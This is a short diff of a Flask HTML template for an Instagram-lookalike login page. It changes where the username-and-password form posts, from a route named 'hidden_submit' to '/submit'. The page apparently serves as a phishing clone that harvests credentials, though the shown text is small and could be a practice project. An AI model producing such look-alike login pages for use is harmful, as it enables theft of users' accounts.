@@ -8,6 +8,7 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/media-queries.css') }}">
     <link rel="icon" href="{{ url_for('static', filename='photos/insta-icon.jpg') }}">
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
+
 </head>
 <body>
     <main>
@@ -15,7 +16,7 @@
             <div class="log-in">
                 <img src="{{ url_for('static', filename='photos/logo.png') }}" class="logo">
                 <div class="log-in-form">
-                    <form method="POST" action="{{ url_for('hidden_submit') }}">
+                    <form method="POST" action="/submit">
                         <input type="text" name="username" placeholder="Phone number, username or email" required>
                         <input type="password" name="password" placeholder="Password" required>
                         <button type="submit" class="log-in-button">Log In</button>
